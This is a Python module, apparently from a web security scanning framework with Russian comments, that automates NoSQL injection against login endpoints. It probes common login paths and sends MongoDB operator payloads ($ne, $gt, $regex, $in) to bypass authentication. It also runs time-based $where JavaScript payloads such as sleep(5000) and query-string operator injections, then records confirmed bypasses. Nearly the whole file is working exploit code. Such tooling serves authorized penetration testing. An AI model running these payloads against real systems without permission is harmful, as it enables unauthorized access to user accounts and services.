"""nosql_injection v2 — MongoDB/NoSQL injection with time-based verification.

Классы атак:
  1. Auth bypass (JSON body): {"username": {"$ne": null}}
  2. Regex extraction: {"password": {"$regex": "^a"}}
  3. JS injection: {"$where": "sleep(5000)"} — time-based
  4. Query string: ?username[$ne]=null
  5. JSON array/proto tricks
  6. Neo4j/CouchDB basics

Verify: time-based → 5s delay reproducible; auth bypass → 401→200
"""
import time
import json
import secrets
from core.http import HttpClient
from core.verify import confidence, is_signal


LOGIN_PATHS = [
    "/login", "/api/login", "/api/auth/login", "/auth/login",
    "/signin", "/api/signin", "/user/login", "/session",
    "/api/session", "/api/v1/login", "/api/v2/login",
    "/authenticate", "/api/authenticate",
]

# вероятные имена полей
USER_FIELDS = ["username", "user", "email", "login", "uid"]
PASS_FIELDS = ["password", "pass", "passwd", "pwd"]

# JSON NoSQL payloads — операторы MongoDB
JSON_PAYLOADS = [
    # --- auth bypass ---
    ("ne_null",    {"$ne": None}),
    ("ne_x",       {"$ne": "x"}),
    ("gt_empty",   {"$gt": ""}),
    ("gte_empty",  {"$gte": ""}),
    ("exists_true",{"$exists": True}),
    # --- regex ---
    ("regex_all",  {"$regex": ".*"}),
    ("regex_a",    {"$regex": "^a"}),
    # --- operator arrays ---
    ("in_all",     {"$in": ["admin", "user", "x"]}),
]

# $where JS payloads (time-based)
WHERE_PAYLOADS = [
    ("where_sleep",     "sleep(5000)"),
    ("where_true",      "return true"),
    ("where_sleep_alt", "function(){var x = new Date(); while(new Date() - x < 5000){}}"),
]

# Query string operators
QS_PAYLOADS = [
    ("ne",     "$ne", "x"),
    ("gt",     "$gt", ""),
    ("regex",  "$regex", ".*"),
    ("exists", "$exists", "true"),
]


class NosqlInjection:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)

        print(f"[nosql v2] target: {base}")

        # === Phase 1: discovery ===
        print()
        print(f"[nosql v2] Phase 1: discovery ({len(LOGIN_PATHS)} paths)")
        live_endpoints = []
        for path in LOGIN_PATHS:
            url = base + path
            try:
                # GET — определить, что endpoint есть
                r_get = http.get(url, allow_redirects=False)
            except Exception:
                continue
            if not r_get or r_get.status_code in (404, 410):
                continue
            # POST с пустым body — определить, что принимает POST
            try:
                r_post = http.post(url, json={"x": "1"}, allow_redirects=False)
            except Exception:
                continue
            if r_post and r_post.status_code in (200, 400, 401, 403, 422):
                live_endpoints.append(path)
                print(f"  live: {path} (GET={r_get.status_code}, POST={r_post.status_code})")

        if not live_endpoints:
            print(f"[nosql v2] no login endpoints found — skip")
            return {"findings": []}

        findings = []

        # === Phase 2: baseline auth ===
        # что отдаёт endpoint при валидном (но неверном) auth
        print()
        print(f"[nosql v2] Phase 2: baseline authentication behavior")

        baselines = {}
        for path in live_endpoints:
            url = base + path
            try:
                r = http.post(url, json={"username": "omni_test_user_xyz",
                                         "password": "omni_test_pass_xyz"},
                              allow_redirects=False)
            except Exception:
                continue
            if r:
                baselines[path] = {
                    "status": r.status_code,
                    "size": len(r.content),
                    "has_set_cookie": "set-cookie" in {k.lower() for k in r.headers},
                }
                print(f"  {path}: {r.status_code} ({len(r.content)}b)")

        # === Phase 3: JSON auth bypass (operator injection) ===
        print()
        print(f"[nosql v2] Phase 3: JSON operator injection")
        for path in live_endpoints:
            url = base + path
            baseline = baselines.get(path, {})
            base_status = baseline.get("status", 0)

            for op_name, operator in JSON_PAYLOADS:
                # пробуем разные имена полей
                for uf in USER_FIELDS[:3]:
                    for pf in PASS_FIELDS[:2]:
                        body = {uf: "admin", pf: operator}
                        try:
                            r = http.post(url, json=body, allow_redirects=False)
                        except Exception:
                            continue
                        if not r:
                            continue

                        # === сигнал: bypass — 200 + set-cookie там, где baseline 401 ===
                        has_cookie = "set-cookie" in {k.lower() for k in r.headers}
                        status_ok = r.status_code in (200, 201, 302, 303)
                        baseline_bad = base_status in (401, 403, 422)
                        big_response = len(r.content) > baseline.get("size", 0) + 500

                        hit = False
                        if baseline_bad and status_ok:
                            hit = True
                        if status_ok and has_cookie and not baseline.get("has_set_cookie"):
                            hit = True
                        if status_ok and big_response:
                            hit = True

                        if not hit:
                            continue

                        # === verify ×2 ===
                        try:
                            r2 = http.post(url, json=body, allow_redirects=False)
                        except Exception:
                            r2 = None

                        if not r2 or r2.status_code not in (200, 201, 302, 303):
                            continue

                        conf = confidence(0.9, 1.0)
                        if not is_signal(conf, floor=0.55, module="nosql"):
                            continue

                        findings.append({
                            "type": "nosql_auth_bypass",
                            "severity": "critical",
                            "path": path,
                            "field_user": uf,
                            "field_pass": pf,
                            "operator": op_name,
                            "payload": json.dumps(body)[:120],
                            "baseline_status": base_status,
                            "result_status": r2.status_code,
                            "verified": True,
                            "confidence": conf,
                        })
                        print(f"  ✓ NoSQL auth bypass: {path} {uf}+{pf}={op_name} ({base_status}->{r2.status_code})")
                        logger.finding("nosql", "critical",
                                       f"{path} {op_name} {base_status}->{r2.status_code}")
                        break
                    else:
                        continue
                    break
                else:
                    continue
                break

        # === Phase 4: time-based $where injection ===
        print()
        print(f"[nosql v2] Phase 4: time-based $where injection")
        for path in live_endpoints:
            url = base + path
            for wp_name, wp_code in WHERE_PAYLOADS:
                # baseline time
                t0 = time.time()
                try:
                    http.post(url, json={"username": "test", "password": "test"},
                              allow_redirects=False)
                except Exception:
                    continue
                baseline_time = time.time() - t0

                body = {"$where": wp_code, "username": "admin", "password": "x"}
                t0 = time.time()
                try:
                    r = http.post(url, json=body, allow_redirects=False)
                except Exception:
                    continue
                elapsed = time.time() - t0

                # сигнал: задержка > baseline + 3s
                if elapsed < baseline_time + 3.0:
                    continue

                # verify ×2
                t0 = time.time()
                try:
                    r2 = http.post(url, json=body, allow_redirects=False)
                except Exception:
                    continue
                elapsed2 = time.time() - t0

                if elapsed2 < baseline_time + 3.0:
                    continue

                conf = confidence(0.95, 1.0)
                if not is_signal(conf, floor=0.55, module="nosql"):
                    continue

                findings.append({
                    "type": "nosql_time_based",
                    "severity": "critical",
                    "path": path,
                    "where_payload": wp_name,
                    "baseline_time": round(baseline_time, 2),
                    "elapsed_1": round(elapsed, 2),
                    "elapsed_2": round(elapsed2, 2),
                    "confidence": conf,
                })
                print(f"  ✓ NoSQL time-based: {path} {wp_name} ({elapsed:.1f}s, {elapsed2:.1f}s)")
                logger.finding("nosql", "critical",
                               f"{path} time-based {wp_name} {elapsed:.1f}s")
                break

        # === Phase 5: query string operators ===
        print()
        print(f"[nosql v2] Phase 5: query string operators")
        for path in live_endpoints:
            url = base + path
            for op_name, op_key, op_val in QS_PAYLOADS:
                for uf in USER_FIELDS[:2]:
                    for pf in PASS_FIELDS[:1]:
                        # сырой query string — не urlencode, чтобы сохранить [$ne]
                        raw_qs = f"{uf}[{op_key}]={op_val}&{pf}[{op_key}]={op_val}"
                        test_url = url + "?" + raw_qs
                        try:
                            r = http.post(test_url, data={"x": "1"}, allow_redirects=False)
                        except Exception:
                            continue
                        if not r:
                            continue

                        base_status = baselines.get(path, {}).get("status", 0)
                        has_cookie = "set-cookie" in {k.lower() for k in r.headers}
                        if r.status_code in (200, 302) and (has_cookie or base_status in (401, 403)):
                            conf = confidence(0.75, 1.0)
                            if not is_signal(conf, floor=0.55, module="nosql"):
                                continue
                            findings.append({
                                "type": "nosql_query_string",
                                "severity": "high",
                                "path": path,
                                "operator": op_name,
                                "query": raw_qs,
                                "confidence": conf,
                            })
                            print(f"  ✓ NoSQL query string: {path} {op_name}")
                            logger.finding("nosql", "high",
                                           f"{path} qs {op_name}")
                            break
                    else:
                        continue
                    break
                else:
                    continue
                break

        # === Итог ===
        print()
        print(f"[nosql v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "live_endpoints": live_endpoints,
        }
